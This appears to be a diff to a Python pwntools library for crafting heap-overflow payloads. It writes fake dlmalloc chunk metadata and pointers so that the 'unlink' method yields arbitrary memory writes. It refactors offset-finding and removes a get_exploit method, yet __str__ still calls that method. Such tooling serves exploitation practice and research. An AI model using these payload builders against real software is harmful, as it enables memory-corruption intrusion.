@@ -3,8 +3,8 @@ from pwn import *
 
 # TODO support for overwriting using forward consolidation
 # TODO support for overwriting using forward consolidation only
-# TODO edgecase that metadata's prevsize can be used as size
-# TODO add support for arch 32 and 64
+# TODO edgecase that metadata's prevsize can be used as size => DONE
+# TODO add support for arch 32 and 64   => DONE
 # TODO support for overwriting using frontlink method
 # TODO what if we can overwrite ONLY the metadata of C
 
@@ -40,8 +40,6 @@ class HeapPayloadCrafter(object):
         self.populating_character = kw.get("populating_character", "*")
 
     def can_use(self, content, start, length):
-        print repr(content[start: start+length])
-        print repr([self.populating_character] * length)
         return content[start: start+length] == [self.populating_character] * length
 
     def populate_content(self, **kw):
@@ -64,6 +62,26 @@ class HeapPayloadCrafter(object):
 
         return full_content
 
+    def find_usable_offset(self, i, full_list, unit_len, values_list, total_length, backward=True):
+        while True:
+            segment = full_list[i: i+unit_len]
+            if len(segment) != unit_len:
+                if backward:
+                    print "Backward consolidation not possible. Attempting "\
+                          "Forward consolidation."
+                    self.only_fwd_consol = True
+                    return None
+                else:
+                    raise HeaplibException("Not enough space when performing forward consolidation")
+                    return None
+            elif self.can_use(segment, 0, len(segment)):
+                #PREV_SIZE_C = -(i + (self.size*2))
+                contents = flat(values_list)
+                full_list[i:i+unit_len] = list(contents)
+                assert len(full_list) == total_length
+                return i
+            i += 1
+
     def generate_payload(self):
         """
         Generate the payload that will be used to perform arbitrary memory
@@ -79,25 +97,15 @@ class HeapPayloadCrafter(object):
             # Find a contiguous chunk of (self.size*4) bytes that can
             # be used
             i, unit_len = 0, self.size*4
-            while True:
-                segment = post[i: i+unit_len]
-                if len(segment) != unit_len:
-                    print "Backward consolidation not possible. Attempting "\
-                          "Forward consolidation."
-                    self.only_fwd_consol = True
-                    break
-                elif self.can_use(segment, 0, len(segment)):
-                    PREV_SIZE_C = -(i + (self.size*2))
-                    before_c = flat(0xfffffff0, 0xfffffff1, self.destination-12, self.source)
-                    post[i:i+unit_len] = list(before_c)
-                    assert len(post) == self.post_length
-                    break
-                i += 1
+            values_list = [0xfffffff0, 0xfffffff1, self.destination-12, self.source]
+            PREV_SIZE_C = self.find_usable_offset(i, post, unit_len, values_list, self.post_length)
+            PREV_SIZE_C = -(PREV_SIZE_C + (self.size*2))
 
         # If we need to use forward consolidation
         if self.only_fwd_consol or (self.destination_2 and self.source_2):
             raise HeaplibException("Forward consolidation not supported yet.")
             pass
+
         # If no forward consolidation, fill with values that don't cause
         # a crash
         else:
@@ -105,54 +113,17 @@ class HeapPayloadCrafter(object):
             # used to place
             i, unit_len = len(prev), self.size*2
             i -= unit_len
-            if False:
-            #if prev[-4:] == [self.populating_character]*self.size:
+            if prev[-4:] == [self.populating_character]*self.size:
                 SIZE_C = -4
                 after_c = flat(0x41414141)
                 prev[-4:] = list(after_c)
             else:
-                while True:
-                    print i, unit_len
-                    segment = prev[i: i+unit_len]
-                    if i < 0 or (len(segment) != unit_len):
-                        raise HeaplibException("Not enough space when performing forward consolidation")
-                        break
-                    elif self.can_use(segment, 0, len(segment)):
-                        SIZE_C = -i
-                        after_c = flat(0xfffffff0, 0xfffffff8)
-                        prev[i:i+unit_len] = list(after_c)
-                        assert len(prev) == self.pre_length
-                        break
-                    i -= 1
-            SIZE_C |= 1
+                values_list = [0xfffffff0, 0xfffffff8]
+                SIZE_C = self.find_usable_offset(i, prev, unit_len, values_list, self.pre_length)
+                SIZE_C = -SIZE_C
+            SIZE_C &= (-2)   # fffffffe or its equivalent based on arch
 
         return PREV_SIZE_C, post, SIZE_C, prev
-
-    def get_exploit(self):
-        """
-        The exploit returned will be in 2 parts.
-        - The first part will contain data upto the part that
-        is intended to overwrite the header of the next chunk.
-        - The second part is supposed to be the data part of the
-        chunk who is about to be freed.
-
-        Uses the 'unlink' method to craft 2 values :
-        1. CraftedMetadata
-            This should overwrite the metadata of the block
-            being freed.
-        2. CraftedBlock
-            This should be places in memory right after the
-            crafted memory i.e. as the data of the block
-            being freed.
-        """
-        if self.allocator == "dlmalloc":
-            if not bytes_to_nextheader:
-                return str(CraftedMetadata()), str(CraftedBlock(self.source-12, self.destination))
-            else:
-                content = self.populate_content()
-                payload = self.generate_payload(content)
-
-        raise HeaplibException("Allocator not supported")
 
     def __str__(self):
         return ''.join(self.get_exploit())
